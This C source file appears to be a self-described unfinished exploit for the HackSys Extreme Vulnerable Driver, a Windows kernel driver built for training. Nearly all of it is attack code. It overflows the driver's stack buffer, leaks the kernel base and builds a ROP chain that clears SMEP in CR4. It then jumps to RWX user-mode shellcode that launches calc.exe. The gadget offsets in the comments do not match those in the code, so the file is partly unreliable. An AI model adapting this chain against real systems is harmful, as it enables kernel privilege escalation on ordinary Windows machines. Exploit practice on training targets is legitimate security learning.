#include <Windows.h>
#include <Psapi.h>
#include <stdlib.h>
#include <stdio.h>
/*
This Payload will exploit a Stack Overflow in the HEVD Driver.
The Vulnerability is possible because a user-supplied size is 
passed to memcpy().

The payload is work in progress.
*/

//ioctl code to trigger Stack Overflow vulnerability
#define IOCTL_CODE 0x222003

// Get base of ntoskrnl.exe
LPVOID GetNTOsBase()
{
    LPVOID Bases[0x1000];
    DWORD needed = 0;
    LPVOID krnlbase = NULL;
    if (EnumDeviceDrivers(Bases, sizeof(Bases), &needed))
    {
        krnlbase = Bases[0];
    }
    return krnlbase;
}

int main()
{
    //Create Handle to HEVD Driver
    HANDLE drivObjHndl = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    //Check if handle is valid
    if (drivObjHndl == INVALID_HANDLE_VALUE)
    {
        printf("No handle to driver :(\n");
        exit(-1);
    }

    //variable for DeviceIoControl->lpBytesReturned parameter
    DWORD bytesRtrnd;

    printf("Setting up payload!\n");

    /*
    Payload:
    - 2080 bytes until EIP overwrite
    - 4 bytes pop eax # ret (0x19a536)
    - 8 byte padding [ret 8 in HEVD]  
    - 4 byte SMEP value (0x000406e9) 
    - 4 byte mov cr4, eax # ret (0x0010bfeb)
    - 4 byte shellcode pointer
    */

    //Overflow Buffer in HEVD
    char payload[2104];
    //Offset until EIP Overwrite
    int offsetEIP = 2080;

    //Fill junk offset with 'A' until EIP overwrite
    memset(payload, 'A', sizeof(payload));

    //Pop calc.exe shellcode without null-bytes (from: https://www.arsouyes.org/en/blog/2020/01_Shellcode_Windows)
    char shellcode[] = {
        0xeb, 0x44, 0x5b, 0x33, 0xd2, 0x88, 0x53, 0x0b,
        0x53, 0xb8, 0x00, 0x91,
        0x56, 0x77,
        0xff, 0xd0, 0xeb, 0x45, 0x5b, 0x33, 0xd2, 0x88,
        0x53, 0x0d, 0x53, 0x50, 0xb8, 0x30, 0x59, 
        0x56, 0x77,
        0xff, 0xd0, 0xeb, 0x47, 0x5b, 0x33, 0xd2, 0x88, 
        0x53, 0x08, 0xeb, 0x4d, 0x59, 0x33, 0xd2, 0x88,
        0x51, 0x04, 0x33, 0xd2, 0x6a, 0x05, 0x52, 0x52,
        0x53, 0x51, 0x52, 0xff, 0xd0, 0x33, 0xd2, 0x52, 
        0xb8, 0x80, 0xf3,
        0x56, 0x77,
        0xff, 0xd0, 0xe8, 0xb7, 0xff, 0xff, 0xff, 0x53,
        0x68, 0x65, 0x6c, 0x6c, 0x33, 0x32, 0x2e, 0x64,
        0x6c, 0x6c, 0x58, 0xe8, 0xb6, 0xff, 0xff, 0xff,
        0x53, 0x68, 0x65, 0x6c, 0x6c, 0x45, 0x78, 0x65,
        0x63, 0x75, 0x74, 0x65, 0x41, 0x58, 0xe8, 0xb4,
        0xff, 0xff, 0xff, 0x63, 0x61, 0x6c, 0x63, 0x2e,
        0x65, 0x78, 0x65, 0x58, 0xe8, 0xae, 0xff, 0xff,
        0xff, 0x6f, 0x70, 0x65, 0x6e, 0x58};

    //Allocate (executable) memory for shellcode
    LPVOID shellcode_ptr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcode_ptr)
    {
        printf("Couldn't allocate shellcode :(\n");
        exit(-1);
    }

    //Move Shellcode into memory segment from VirtualAlloc()
    RtlMoveMemory(shellcode_ptr, shellcode, sizeof(shellcode));

    printf("Shellcode @ 0x%x\n", (INT_PTR)shellcode_ptr);

    printf("Getting Kernel Base Address\n");

    //Enumerate device drivers to get kernel address
    //Kernel ('nt' module) base address
    LPVOID kernelBaseAddr = GetNTOsBase();

    if (!kernelBaseAddr)
    {
        printf("Failed to get base address :(\n");
        exit(-1);
    }

    printf("[*] Kernel base address @ 0x%x\n", kernelBaseAddr);

    printf("Building Rop chain...\n");

    /*
    const size_t popEaxOffset = offsetEIP;
    const size_t paddingOffset = offsetEIP + (size_t)0x4;
    const size_t smepOffset = offsetEIP + (size_t)0xc;
    const size_t cr4EaxOffset = offsetEIP + (size_t)0x10;
    const size_t shellcodeOffset = offsetEIP + (size_t)0x14;
    */

    //ROP Gadget: nt!_MapCmDevicePropertyToNtProperty+0x39 (pop eax; ret)
    LPVOID popEax = (LPVOID)(((INT_PTR)kernelBaseAddr) + 0x0010c04b);
    //ROP Gadget: nt!KeFlushCurrentTb+0x9 (mov cr4,eax; ret)
    LPVOID cr4Eax = (LPVOID)(((INT_PTR)kernelBaseAddr) + 0x0019a646);

    printf("[*] \'pop eax; ret\'-Gadget @ 0x%x\n", popEax);
    printf("[*] \'mov cr4, eax\'-Gadget @ 0x%x\n", cr4Eax);

    char padding[8];

    //Add padding
    memset(padding, 'B', sizeof(padding));

    int smepValue = 0x000406e9;

    INT_PTR ropBuf = (INT_PTR)(payload + offsetEIP);

    printf("Starting EIP overwrite address @ 0x%x\n", ropBuf);

    *(INT_PTR *)ropBuf = (INT_PTR)popEax;
    *(INT_PTR *)(ropBuf + 4 * 1) = (INT_PTR)padding;
    *(INT_PTR *)(ropBuf + 4 * 3) = (INT_PTR)smepValue;
    *(INT_PTR *)(ropBuf + 4 * 4) = (INT_PTR)cr4Eax;
    *(INT_PTR *)(ropBuf + 4 * 5) = (INT_PTR)shellcode_ptr;

    /*
    printf("What memcpy doing?\n");
    //Copy ROP chain into payload
    printf("&payload[popEaxOffset] @ 0x%x\n", &payload[popEaxOffset]);
    printf("payload starting address @ 0x%x\n", &payload[0]);
    printf("Size popEax: %d\n", sizeof(popEax));
    printf("popEaxOffset: %d\n", popEaxOffset);
    memcpy(&payload[popEaxOffset], popEax, 0x4);
    printf("&payload[paddingOffset] @ 0x%x", &payload[paddingOffset]);
    memcpy(&payload[paddingOffset], padding, sizeof(padding));
    printf("&payload[smepOffset] @ 0x%x", &payload[smepOffset]);
    memcpy(&payload[smepOffset], &smepValue, 0x4);
    printf("&payload[cr4EaxOffset] @ 0x%x", &payload[cr4EaxOffset]);
    memcpy(&payload[cr4EaxOffset], cr4Eax, 0x4);
    printf("&payload[shellcodeOffset] @ 0x%x", &payload[shellcodeOffset]);
    memcpy(&payload[shellcodeOffset], &shellcode_ptr, 0x4);
    */

    printf("Payload length: 0x%x\n", sizeof(payload));
    printf("Sending Driver Payload!\n");

    //Send exploit to driver
    DeviceIoControl(drivObjHndl, IOCTL_CODE, payload, sizeof(payload), NULL, 0, &bytesRtrnd, NULL);

    //printf("Sent Payload :)\n");

    CloseHandle(drivObjHndl);
}
